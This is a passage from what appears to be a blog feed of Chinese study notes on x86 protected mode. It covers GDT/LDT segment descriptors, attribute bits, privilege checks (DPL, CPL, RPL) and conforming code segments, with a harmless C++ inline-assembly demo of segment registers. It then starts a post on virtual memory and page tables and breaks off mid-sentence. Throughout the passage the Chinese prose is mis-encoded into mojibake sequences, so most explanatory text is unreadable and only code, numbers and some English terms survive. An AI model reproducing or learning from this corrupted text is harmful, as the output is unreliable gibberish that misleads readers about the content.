è¡¨ï¼šGDTå’ŒLDTè¡¨,0è¡¨ç¤ºGDTï¼Œ1è¡¨ç¤ºLDTï¼ˆLDTå¿…é¡»åµŒå¥—åœ¨GDTä¸­ï¼ŒåŒæ—¶å¯ä»¥æœ‰å¤šå¼ LDTï¼‰</p><p>å¦‚æœæ˜¯1ï¼šä¼šè£…è½½æŸä¸€ä¸ªldtè¡¨ï¼Œé€šè¿‡æ®µé€‰æ‹©å­åœ¨gdtä¸­æ‰¾åˆ°ldtæ‰§è¡Œåç»­æ“ä½œ</p><p>å‰5ä½è¡¨ç¤ºæ®µæè¿°ç¬¦ç´¢å¼•ï¼ŒæŒ‡å‘GDTä¸­å­˜æ”¾æ®µæè¿°ç¬¦çš„åœ°å€ï¼Œå³gdt[x],nä¸ºå‰äº”ä½çš„å€¼ï¼Œæ‰€ä»¥</p><figure class="highlight fix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">æ®µæè¿°ç¬¦ä½ç½® </span>=<span class="string"> gdté¦–åœ°å€ + x*8</span></span><br></pre></td></tr></table></figure><p>å…¶ä¸­æ®µæè¿°ç¬¦å­˜æ”¾äº†é™¤äº†æ®µé€‰æ‹©å­ä¹‹å¤–çš„å±æ€§</p><p><img src="https://s2.loli.net/2024/06/03/RvPYDWao5EN7d2b.png" alt="image-20240603014954353"></p><p><img src="https://s2.loli.net/2024/06/03/p1tNuKkRPAUF4Ca.png" alt="image-20240603134721994"></p><p>å…¶ä¸­ï¼š</p><p>ç»¿è‰²è¡¨ç¤ºæ®µåŸºå€<br>è“è‰²è¡¨ç¤ºæ®µç•Œé™<br>é»„è‰²è¡¨ç¤ºæ®µå±æ€§</p><p>æ®µå±æ€§ä¸­ï¼Œå…ˆçœ‹P,DPL,S,TYPEè¿™å‡ æ®µ</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">På ä¸€ä½ï¼š</span><br><span class="line"><span class="attribute">P</span>=0 è¯¥æ®µä¸åœ¨å†…å­˜ä¸­</span><br><span class="line"><span class="attribute">P</span>=1 è¯¥æ®µåœ¨å†…å­˜ä¸­</span><br><span class="line">DPLå 2ä½ï¼š</span><br><span class="line">è¡¨ç¤ºç‰¹æƒç­‰çº§0~3</span><br><span class="line"></span><br><span class="line">Så ä¸€ä½ï¼š</span><br><span class="line"><span class="attribute">S</span>=0 è¯¥æ®µæ˜¯ç³»ç»Ÿæ®µ/é—¨</span><br><span class="line"><span class="attribute">S</span>=1 è¯¥æ®µæ˜¯æ•°æ®æ®µæˆ–ä»£ç æ®µ</span><br><span class="line"></span><br><span class="line">TYPEå 4ä½ï¼š</span><br><span class="line">å¦‚æœ<span class="attribute">S</span>=1</span><br><span class="line">4ä½åˆ†åˆ«ä¸ºï¼šæ‰§è¡Œä½ï¼Œä¸€è‡´/æ–¹å‘ä½ï¼Œè¯»å†™ä½ï¼Œè®¿é—®ä½</span><br><span class="line">æ‰§è¡Œä½ï¼šä¸º0è¡¨ç¤ºè¿™æ˜¯æ•°æ®æ®µï¼Œä¸º1è¡¨ç¤ºæ˜¯ä»£ç æ®µï¼ˆæ˜¯å¦å¯æ‰§è¡Œï¼‰</span><br><span class="line">ä¸€è‡´/æ–¹å‘ä½ï¼šæ‰§è¡Œä½ä¸º1ï¼šä¸º0è¡¨ç¤ºæ™®é€šæ®µï¼Œä¸º1è¡¨ç¤ºä¸€è‡´ä»£ç æ®µï¼›æ‰§è¡Œä½ä¸º0ï¼šä¸º0è¡¨ç¤ºå‘ä¸Šå¢é•¿ï¼Œä¸º1è¡¨ç¤ºå‘ä¸‹å¢é•¿</span><br><span class="line">è¯»å†™ä½ï¼šæ‰§è¡Œä½ä¸º0ï¼šä¸º1è¡¨ç¤ºå¯è¯»å¯å†™ï¼Œä¸º0è¡¨ç¤ºå¯è¯»ï¼›æ‰§è¡Œä½ä¸º1ï¼šä¸º1è¡¨ç¤ºå¯è¯»å¯æ‰§è¡Œï¼Œä¸º0è¡¨ç¤ºå¯æ‰§è¡Œ</span><br><span class="line">è®¿é—®ä½ï¼šä¸º1è¡¨ç¤ºå·²è®¿é—®è¿‡ï¼Œä¸º0è¡¨ç¤ºæœªè®¿é—®è¿‡</span><br></pre></td></tr></table></figure><p>å…¶ä¸­ä¸€è‡´ä½è¡¨ç¤ºæ˜¯ä¸æ˜¯ä¸€è‡´ä»£ç æ®µã€‚<br>è¿™é‡Œéœ€è¦å…ˆçœ‹ä¸€ä¸‹è¿™ä¸ªå®šä¹‰ï¼š</p><blockquote><p>æ“ä½œç³»ç»Ÿä¿æŠ¤æ¨¡å¼ä¸‹æŠŠä»£ç æ®µåˆ†ä¸ºä¸€è‡´ä»£ç æ®µå’Œéä¸€è‡´ä»£ç æ®µçš„åŸå› æ˜¯ï¼šå†…æ ¸ç¨‹åºå’Œç”¨æˆ·ç¨‹åºè¦åˆ†å¼€ï¼Œå†…æ ¸ç¨‹åºä¸èƒ½è¢«ç”¨æˆ·ç¨‹åºå¹²æ‰°ã€‚ä½†æ˜¯æœ‰æ—¶å€™ç”¨æˆ·ç¨‹åºä¹Ÿéœ€è¦è¯»å–å†…æ ¸çš„æŸäº›æ•°æ®ï¼Œäºæ˜¯æ“ä½œç³»ç»Ÿå°±ä»å†…æ ¸ç¨‹åºä¸­åˆ†é…ä¸€äº›å¯ä»¥ä¾›ç”¨æˆ·ç¨‹åºè®¿é—®çš„æ®µï¼Œä½†æ˜¯ä¸å…è®¸ç”¨æˆ·ç¨‹åºå†™å…¥æ•°æ®ï¼Œç”¨æˆ·ç¨‹åºè®¿é—®è¿™äº›æ®µæ—¶éµå¾ªä»¥ä¸‹è§„åˆ™ï¼š</p><ol><li>å†…æ ¸ç¨‹åºä¸çŸ¥é“ç”¨æˆ·ç¨‹åºçš„æ•°æ®ï¼Œä¸è°ƒç”¨ç”¨æˆ·ç¨‹åºçš„æ•°æ®ï¼Œä¹Ÿä¸è½¬ç§»åˆ°ç”¨æˆ·ç¨‹åºä¸­æ¥</li><li>ç”¨æˆ·ç¨‹åºåªèƒ½è®¿é—®åˆ°å†…æ ¸çš„æŸäº›å…±äº«æ®µï¼Œè¿™äº›æ®µç§°ä¸º<code>ä¸€è‡´ä»£ç æ®µ</code></li><li>ç”¨æˆ·ç¨‹åºä¸èƒ½è®¿é—®å†…æ ¸ä¸å…±äº«çš„æ®µ</li></ol></blockquote><p>æ‰€ä»¥ä¸€è‡´ä»£ç æ®µå°±æ˜¯æ“ä½œç³»ç»Ÿå†…æ ¸æ‹¿å‡ºæ¥çš„å…±äº«æ®µï¼š</p><p>æ€§è´¨æ˜¯</p><blockquote><ol><li>ç‰¹æƒçº§é«˜çš„ç¨‹åºä¸å…è®¸è®¿é—®ç‰¹æƒçº§ä½çš„æ•°æ®ï¼šå³å†…æ ¸æ€ä¸å…è®¸è°ƒç”¨ç”¨æˆ·æ€çš„æ•°æ®ã€‚</li><li>ç‰¹æƒçº§ä½çš„ç¨‹åºå¯ä»¥è®¿é—®åˆ°ç‰¹æƒçº§é«˜çš„ç¨‹åºï¼Œä½†æ˜¯ç‰¹æƒçº§ä¸ä¼šæ”¹å˜ï¼Œå³ä¸ä¼šä»ç”¨æˆ·æ€åˆ‡æ¢åˆ°å†…æ ¸æ€ã€‚</li></ol></blockquote><p>æ‰€ä»¥å¦‚æœæ˜¯ä½ç‰¹æƒçº§åˆ°é«˜ç‰¹æƒçº§ï¼Œå¯ä»¥ç›´æ¥è®¿é—®ï¼Œä¸”æƒé™ä¸å˜ï¼Œå¦‚æœæ˜¯é«˜ç‰¹æƒçº§åˆ°ä½ç‰¹æƒçº§ï¼Œè§¦å‘å¸¸è§„ä¿æŠ¤é”™è¯¯ã€‚</p><p>éä¸€è‡´ä»£ç æ®µï¼šä¸ºäº†é¿å…ä½ç‰¹æƒçº§çš„è®¿é—®è€Œè¢«æ“ä½œç³»ç»Ÿä¿æŠ¤èµ·æ¥çš„ç³»ç»Ÿä»£ç </p><p>æ€§è´¨æ˜¯</p><blockquote><ol><li>åªå…è®¸åŒç‰¹æƒçº§è®¿é—®ã€‚</li><li>ç»å¯¹ç¦æ­¢ä¸åŒç‰¹æƒçº§ç›´æ¥è®¿é—®ï¼šå†…æ ¸æ€ä¸å»ç”¨æˆ·æ€ï¼Œç”¨æˆ·æ€ä¹Ÿä¸ä½¿ç”¨å†…æ ¸æ€ã€‚</li><li>é€šå¸¸ä½ç‰¹æƒçº§ä»£ç å¿…é¡»é€šè¿‡<code>é—¨è°ƒç”¨</code>æ¥å®ç°å¯¹é«˜ç‰¹æƒçº§ä»£ç æ®µçš„è®¿é—®å’Œè°ƒç”¨ã€‚</li></ol></blockquote><p>æ‰€ä»¥å¦‚æœç‰¹æƒçº§ä¸ç›¸ç­‰ï¼Œè§¦å‘å¸¸è§„ä¿æŠ¤é”™è¯¯</p><p>è¿™é‡Œçš„ç‰¹æƒç­‰çº§æ£€æµ‹æ˜¯æ ¹æ®DPLå’ŒCPLçš„å€¼æ¥åˆ¤æ–­çš„</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">DPL&gt;<span class="operator">=</span>CPL  </span><br><span class="line">å¯ä»¥è¿›å…¥ä¸€è‡´ä»£ç æ®µ</span><br><span class="line"></span><br><span class="line"><span class="attribute">DPL</span><span class="operator">=</span><span class="operator">=</span>CPL and RPL&lt;<span class="operator">=</span>DPL</span><br><span class="line">å¯ä»¥è¿›å…¥æ™®é€šä»£ç æ®µ/éä¸€è‡´ä»£ç æ®µ</span><br></pre></td></tr></table></figure><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">å¦‚æœS=<span class="number">0</span>ï¼Œç³»ç»Ÿæ®µ</span><br><span class="line">TYPEåªå®šä¹‰äº†<span class="number">12</span>ä¸ªå€¼</span><br><span class="line"><span class="number">0x1</span> å¯ç”¨286TSS</span><br><span class="line"><span class="number">0x2</span> è¯¥æ®µå­˜å‚¨äº†LDTï¼ˆå±€éƒ¨æè¿°ç¬¦è¡¨ï¼‰</span><br><span class="line"><span class="number">0x3</span> å¿™286TSS</span><br><span class="line"><span class="number">0x4</span> <span class="number">286</span>è°ƒç”¨é—¨</span><br><span class="line"><span class="number">0x5</span> ä»»åŠ¡é—¨</span><br><span class="line"><span class="number">0x6</span> <span class="number">286</span>ä¸­æ–­é—¨</span><br><span class="line"><span class="number">0x7</span> <span class="number">286</span>é™·é˜±é—¨</span><br><span class="line"><span class="number">0x8</span> </span><br><span class="line"><span class="number">0x9</span> å¯ç”¨386TSS</span><br><span class="line"><span class="number">0xa</span> </span><br><span class="line"><span class="number">0xb</span> å¿™386TSS</span><br><span class="line"><span class="number">0xc</span> <span class="number">386</span>è°ƒç”¨é—¨</span><br><span class="line"><span class="number">0xd</span> </span><br><span class="line"><span class="number">0xe</span> <span class="number">386</span>ä¸­æ–­é—¨</span><br><span class="line"><span class="number">0xf</span> <span class="number">386</span>é™·é˜±é—¨</span><br></pre></td></tr></table></figure><p>å¦å¤–4ä¸ªå±æ€§</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">AVL å <span class="number">1</span>ä½</span><br><span class="line">æ— å®šä¹‰</span><br><span class="line">L å <span class="number">1</span>ä½</span><br><span class="line">å¦‚æœä»£ç æ®µæ˜¯<span class="number">64</span>ä½ï¼Œä¸º<span class="number">1</span>ï¼ˆæ­¤æ—¶Dä¸º<span class="number">0</span>ï¼‰ï¼Œå¦åˆ™<span class="number">0</span></span><br><span class="line">D/<span class="selector-tag">B</span> å <span class="number">1</span>ä½</span><br><span class="line">å¦‚æœå¯¹åº”ä»£ç æ®µDï¼šè¿™æ˜¯<span class="number">32</span>ä½ä»£ç æ®µä¸º<span class="number">1</span>ï¼Œå¦åˆ™ä¸º<span class="number">16</span>ä½ä»£ç æ®µä¸º<span class="number">0</span></span><br><span class="line">å¦‚æœå¯¹åº”æ ˆæ®µ<span class="selector-tag">B</span>ï¼šæ˜¯è¢«SSå¯„å­˜å™¨æŒ‡å‘çš„æ•°æ®æ®µ</span><br><span class="line">ä¸º<span class="number">1</span>ï¼šé‡‡ç”¨<span class="number">32</span>ä½æ ˆæŒ‡é’ˆå¯„å­˜å™¨ï¼Œå¦åˆ™ä¸º<span class="number">0</span>ï¼Œé‡‡ç”¨<span class="number">16</span>ä½æ ˆæŒ‡é’ˆå¯„å­˜å™¨</span><br><span class="line">å¦‚æœå¯¹åº”å‘ä¸‹æ‰©å±•çš„æ•°æ®æ®µ<span class="selector-tag">B</span>ï¼š</span><br><span class="line">ä¸º<span class="number">1</span>ï¼šæ®µçš„ä¸Šç•Œä¸º<span class="number">4</span>GBï¼Œä¸º<span class="number">0</span>ï¼šä¸Šç•Œä¸º<span class="number">64</span>KB</span><br><span class="line">G å ä¸€ä½</span><br><span class="line">ä¸º<span class="number">0</span>ï¼šæ®µç•Œé™ç²’åº¦ï¼ˆå•ä½ï¼‰ä¸ºå­—èŠ‚ï¼Œä¸º<span class="number">1</span>ï¼šæ®µç•Œé™å•ä½ä¸º<span class="number">4</span>KB</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆåˆæœ‰ä¸€ä¸ªé—®é¢˜ï¼š</p><p>ä¸ºä»€ä¹ˆæ®µå¯„å­˜å™¨ä¸€å…±æœ‰96ä½ï¼Œè¿™é‡Œä¸æ˜¯ä¸€å…±æ‰64ï¼ˆæ®µæè¿°ç¬¦ï¼‰+16ï¼ˆæ®µé€‰æ‹©å­ï¼‰=80ä½å—</p><p>è¿™é‡Œä¼šå‘ç°ï¼šæ®µæè¿°ç¬¦ä¸­çš„limitæ®µæ˜¯3å­—èŠ‚ï¼Œæœ€å¤§å€¼ä¸ºffffffï¼Œåˆæœ‰Gå¯ä»¥è¡¨ç¤ºæœ€å¤§å•ä½ä¸º4KB,å†åŠ å±æ€§é‡Œé¢çš„ä¿ç•™çš„ä¸€ï¼ˆåå…­è¿›åˆ¶ï¼‰ä½ç©ºä½<br>(ffffff-1)*4096=ffffffff<br>(8+4)x4+8x4+16=96</p><p>è¿™ä¸ªä¸åƒæ•°ç»„ï¼Œç•Œé™ä¸ºFFFFFFFFé‚£ä¹ˆå®ƒå¯ä»¥å–åˆ°0~FFFFFFFF</p><p>å‚è€ƒèµ„æ–™</p><p><a href="https://blog.csdn.net/linuxheik/article/details/7542320">RPLä¿å­˜åœ¨é€‰æ‹©å­é‡Œï¼Œé‚£ä¹ˆCPLæ˜¯ä¿å­˜åœ¨å“ªé‡Œçš„_cpl åœ¨å“ªé‡Œ-CSDNåšå®¢</a></p><p><a href="https://blog.csdn.net/abc123lzf/article/details/109289567">x86ä¿æŠ¤æ¨¡å¼â€”â€”å…¨å±€æè¿°ç¬¦è¡¨GDTè¯¦è§£_gdtå…¨å±€æè¿°ç¬¦è¡¨ ä½œç”¨-CSDNåšå®¢</a></p><h2 id="æ®µé€‰æ‹©å™¨æˆå‘˜">æ®µé€‰æ‹©å™¨æˆå‘˜</h2><p><img src="https://s2.loli.net/2024/06/18/g6plXIqAvzMOa2h.png" alt="image-20240618175919652"></p><p>FSåœ°å€ä¸ä¸€å®šå’Œå›¾ä¸­ç›¸åŒ</p><p>é€šè¿‡ä»¥ä¸‹ä»£ç æŸ¥çœ‹å¯¹åº”æ®µå¯„å­˜å™¨çš„è¯»å†™å±æ€§</p><p>ï¼ˆç”±äºï¼‰</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;tchar.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span> var = <span class="number">0</span>;</span><br><span class="line">__asm</span><br><span class="line">&#123;</span><br><span class="line">mov ax, ss;</span><br><span class="line">mov ds, ax;</span><br><span class="line">mov edx, <span class="number">1</span>;</span><br><span class="line">mov dword ptr ds : [var] , edx;</span><br><span class="line">&#125;</span><br><span class="line">std::cout &lt;&lt; var;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªç¨‹åºå¯ä»¥é€šè¿‡ï¼Œä¸”è¡¨æ˜äº†sså¯è¯»ï¼Œdså¯å†™çš„å±æ€§</p><p>å°†å…¶æ¢ä¸º</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;tchar.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span> var = <span class="number">0</span>;</span><br><span class="line">__asm</span><br><span class="line">&#123;</span><br><span class="line">mov ax, cs;</span><br><span class="line">mov ds, ax;</span><br><span class="line">mov edx, <span class="number">1</span>;</span><br><span class="line">mov dword ptr ds : [var] , edx;</span><br><span class="line">&#125;</span><br><span class="line">std::cout &lt;&lt; var;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å‘ç°è°ƒè¯•çŠ¶æ€å¯ä»¥æ‰§è¡Œï¼Œç›´æ¥è¿è¡Œä¼šåœ¨è¾“å‡ºæ—¶æŠ¥é”™</p><p>å…³äºä¸ºä»€ä¹ˆä¸èƒ½ç›´æ¥ç”¨ç«‹å³æ•°ç»™æ®µå¯„å­˜å™¨èµ‹å€¼ï¼š</p><p>ç½‘ä¸Šçš„è§£é‡Šï¼š</p><p><a href="https://bbs.csdn.net/topics/340215235">ä¸ºä»€ä¹ˆç«‹å³æ•°ä¸èƒ½ç›´æ¥èµ‹ç»™æ®µå¯„å­˜å™¨-CSDNç¤¾åŒº</a></p><p>ä¸æ‡‚QAQ</p><hr><p>åœ¨çº¿ç¨‹å’Œè¿›ç¨‹ä¸æ”¹å˜æ—¶ï¼Œåœ¨å†™ä¹‹åçš„è¯»ä¸ä¼šè¯»gdtï¼Œåœ¨æ‰‹å·¥ä¿®æ”¹è¿›ç¨‹çº¿ç¨‹æ—¶ï¼Œä¼šè¯»ä¸€æ¬¡gdt</p>]]></content>
      
      
      <categories>
          
          <category> çŸ¥è¯†é›† </category>
          
          <category> é€†å‘ </category>
          
          <category> Winæ ¸å¿ƒ </category>
          
          <category> Winå†…æ ¸ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> re </tag>
            
            <tag> æ®µ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>win-è™šæ‹Ÿå†…å­˜ä¸å†…å­˜ç®¡ç†</title>
      <link href="/posts/c53724db.html"/>
      <url>/posts/c53724db.html</url>
      
        <content type="html"><![CDATA[<h2 id="è™šæ‹Ÿå†…å­˜">è™šæ‹Ÿå†…å­˜</h2><h3 id="ç‰©ç†å¯»å€å’Œè™šæ‹Ÿå¯»å€">ç‰©ç†å¯»å€å’Œè™šæ‹Ÿå¯»å€</h3><p>æŠŠç‰©ç†å†…å­˜åˆ†ä¸ºMä¸ªè¿ç»­çš„å­—èŠ‚æ•°ç»„ã€‚åˆ†åˆ«æ ‡å·ä¸º0,1,2â€¦è¿™å°±æ˜¯ç‰©ç†åœ°å€ã€‚</p><p>CPUç›´æ¥æŸ¥æ‰¾å¯¹åº”çš„ç‰©ç†åœ°å€æ¥æŸ¥æ‰¾ä¿¡æ¯å°±æ˜¯<code>ç‰©ç†å¯»å€</code>ã€‚CPUç›´æ¥å¯¹å†…å­˜æ€»çº¿å‘é€åœ°å€ç„¶åä¸»å­˜æ¥æ”¶åˆ°ä»¥åè¿”å›å†…å®¹ç»™CPUï¼Œå¹¶æ”¾åœ¨å¯„å­˜å™¨é‡Œã€‚</p><p>ç°åœ¨ï¼ŒCPUä¸€èˆ¬å…ˆç”Ÿæˆä¸€ä¸ªè™šæ‹Ÿåœ°å€ï¼Œç„¶åå°†è™šæ‹Ÿåœ°å€å‘é€ç»™MMU(å†…å­˜ç®¡ç†å•å…ƒ)ç¿»è¯‘æˆç‰©ç†åœ°å€ï¼Œè¿™æ—¶æ‰å‘é€ç»™ä¸»å­˜ï¼Œå®ƒå†è¿”å›åœ°å€ä¸­çš„å†…å®¹ã€‚è¿™å«<code>è™šæ‹Ÿå¯»å€</code></p><blockquote><p>ç®€è¦åœ°å€ç¿»è¯‘æµç¨‹ï¼š</p><p>åœ¨å†…å­˜ä¸­å­˜æ”¾äº†ä¸€ä¸ªæŸ¥è¯¢è¡¨ï¼ˆç§°ä¸ºé¡µè¡¨ï¼‰ï¼ŒMMUé€šè¿‡è¯»å–æŸ¥è¯¢è¡¨æ¥åŠ¨æ€ç¿»è¯‘è™šæ‹Ÿåœ°å€ï¼Œè¡¨çš„å†…å®¹ç”±æ“ä½œç³»ç»Ÿç®¡ç†ã€‚ï¼ˆä¸€èˆ¬æƒ…å†µä¸‹ï¼Œç¬¬ä¸€çº§é¡µè¡¨å°±åœ¨MMUä¸­ï¼Œè¢«ç§°ä¸ºTLBï¼Œè¿™æ ·é€Ÿåº¦æ›´å¿«ï¼‰</p></blockquote><hr><h3 id="åœ°å€ç©ºé—´">åœ°å€ç©ºé—´</h3><p>ä¸€ä¸ªéè´Ÿæ•´æ•°åœ°å€çš„æœ‰åºé›†åˆã€‚æ„æ€æ˜¯ï¼šç”¨è‡ªç„¶æ•°ä»0å¼€å§‹ä¾æ¬¡ä¸ºä¸€ä¸ªåœ°æ–¹ç¼–å·ï¼Œå¾—åˆ°çš„æ•°çš„æœ‰åºé›†åˆå°±æ˜¯<code>åœ°å€ç©ºé—´</code>ã€‚å¦‚æœè¿™ä¸ªåœ°å€ç©ºé—´çš„å…ƒç´ æ˜¯è¿ç»­çš„æ•´æ•°ï¼Œå°±ç§°å®ƒä¸º<code>çº¿æ€§åœ°å€ç©ºé—´</code>ã€‚</p><p>ç°åœ¨ï¼ŒCPUé€šè¿‡æ˜ å°„næ¯”ç‰¹ä½å¾—åˆ°äº†$2^n$ä¸ªåœ°å€ç¼–å·ï¼Œå½¢æˆçš„çº¿æ€§åœ°å€ç©ºé—´çš„å¤§å°æ˜¯$2^n$ã€‚è®°ä½œ$N = 2^n$ï¼Œæœ€å°åœ°å€æ˜¯0ï¼Œæœ€å¤§åœ°å€æ˜¯$N-1$ã€‚è¿™æ ·å½¢æˆçš„åœ°å€ç©ºé—´è¢«å«åš<code>nä½åœ°å€ç©ºé—´</code>ã€‚å®ƒè¡¨ç¤ºè™šæ‹Ÿå†…å­˜ï¼Œç°åœ¨çš„32ä½ç³»ç»Ÿ/64ä½ç³»ç»Ÿå³æ˜¯è¿™ä¸ªæ„æ€ã€‚</p><p>å†…å­˜ä¹Ÿæœ‰ä¸€ä¸ªç©ºé—´ï¼Œå®ƒæ˜¯ç‰©ç†å­˜åœ¨çš„ã€‚å®ƒçš„å¤§å°è®°ä½œMï¼Œä¸è¦æ±‚ä¸€å®šä¸º2çš„å¹‚æ¬¡ã€‚</p><hr><h3 id="é¡µ">é¡µ</h3><p>æˆ‘ä»¬å·²ç»çŸ¥é“æ˜¯ä»è™šæ‹Ÿåœ°å€åˆ°ç‰©ç†åœ°å€çš„æ˜ å°„äº†ï¼Œé¡µçš„å®ç°å°±æ˜¯æ˜ å°„å®ç°çš„å…·ä½“æ–¹å¼ã€‚</p><p>ä¸ºäº†è®©è™šæ‹Ÿå†…å­˜ä¸­çš„åœ°å€å¯ä»¥é¡ºåˆ©è½¬æ¢åˆ°ç‰©ç†åœ°å€ï¼Œæˆ‘ä»¬è§„å®šæ¯4KBé•¿åº¦çš„åœ°å€ç§°ä¸ºä¸€ä¸ª<code>é¡µ</code>ï¼Œå’Œåœ°å€ä¸€æ ·ï¼Œåˆ†ä¸ºè™šæ‹Ÿé¡µå’Œç‰©ç†é¡µ(ç‰©ç†é¡µåˆç§°ä¸ºé¡µå¸§)ã€‚è™šæ‹Ÿé¡µé¢çš„é›†åˆä¸º{æœªåˆ†é…çš„é¡µï¼Œå·²ç¼“å­˜çš„é¡µï¼Œæœªç¼“å­˜çš„é¡µ}ï¼Œåä¸¤é¡¹ç»Ÿç§°å·²åˆ†é…çš„é¡µã€‚æˆ‘ä»¬æŠŠä¸€ä¸ªè™šæ‹Ÿä¹Ÿçš„å¤§å°ç§°ä¸º$P=2^p$</p><p>è€Œæ˜ å°„çš„åŸºæœ¬å•ä½å°±æ˜¯ä¸€ä¸ªé¡µã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œä¸€ä¸ªè¿›ç¨‹åœ¨å†…å­˜ä¸­æ˜¯è¢«åˆ’åˆ†ä¸ºné¡µåˆ†å¼€å­˜æ”¾çš„ï¼ˆä¹Ÿå¯ä»¥æŒ¨åœ¨ä¸€èµ·ï¼‰</p><blockquote><p>ç¼“å­˜è¡¨ç¤ºå·²ç»åˆ†é…åˆ°ç‰©ç†å†…å­˜ä¸­ï¼Œè€Œæœªç¼“å­˜è¡¨ç¤ºåœ¨å…¶å®ƒå­˜å‚¨ä»‹è´¨ä¸­ï¼Œæ¯”å¦‚ç¡¬ç›˜ã€‚å¦‚æœç³»ç»ŸæŸ¥è¯¢é¡µæ—¶å‘ç°æ˜¯æœªç¼“å­˜é¡µï¼Œè¿™ç§°ä¸ºæœªå‘½ä¸­(ç¼ºé¡µ)ï¼Œç„¶åè¦æŠŠé‚£ä¸ªé¡µå’Œå†…å­˜ä¸­çš„ä¸€ä¸ªç‰©ç†é¡µäº¤æ¢ä»¥è®¿é—®å®ƒ</p></blockquote><h3 id="é¡µè¡¨">é¡µè¡¨</h3><p>ç³»ç»Ÿä¸ºäº†æŸ¥è¯¢å“ªäº›é¡µæ˜¯å·²ç»åˆ†é…çš„ï¼Œå“ªäº›é¡µæ˜¯æ²¡æœ‰ç¼“å­˜çš„ï¼Œä»¥åŠé¡µç¼“å­˜åœ¨å“ªé‡Œç­‰ä¿¡æ¯ï¼ŒåŒç¡¬ä»¶/è½¯ä»¶ä¸€èµ·åœ¨å†…å­˜ä¸­ç»´æŠ¤äº†ä¸€å¼ é¡µè¡¨ã€‚æ¯ä¸ªé¡µè¡¨éƒ½æ˜¯ä¸€ä¸ªé¡µè¡¨æ¡ç›®(PTE)æ•°ç»„</p><p>é¡µè¡¨ä¸­æ¯ä¸€ä¸ªè™šæ‹Ÿåœ°å€éƒ½å¯¹åº”äº†ä¸€ä¸ªç‰©ç†åœ°å€ï¼Œä¹Ÿå¯èƒ½å¯¹åº”å…¶å®ƒç¡¬ä»¶ï¼Œæ¯”å¦‚ç£ç›˜çš„æŸä¸ªä½ç½®ã€‚åŒæ—¶è®¾ç½®äº†ä¸€äº›æ ‡å¿—æ¥åˆ¤æ–­éƒ¨åˆ†æƒ…å†µ(æ¯”å¦‚å¯èƒ½0è¡¨ç¤ºæ²¡æœ‰æ˜ å°„)</p><h3 id="ç¼ºé¡µ">ç¼ºé¡µ</h3><p>å¦‚æœcpuæŸ¥è¯¢é¡µè¡¨å‘ç°å®ƒæ˜¯ä¸€ä¸ªæœªç¼“å­˜é¡µï¼Œå°±ä¼šå¼•å‘ä¸€ä¸ª<code>ç¼ºé¡µå¼‚å¸¸</code>ï¼Œä»è€Œè¿›å…¥å†…æ 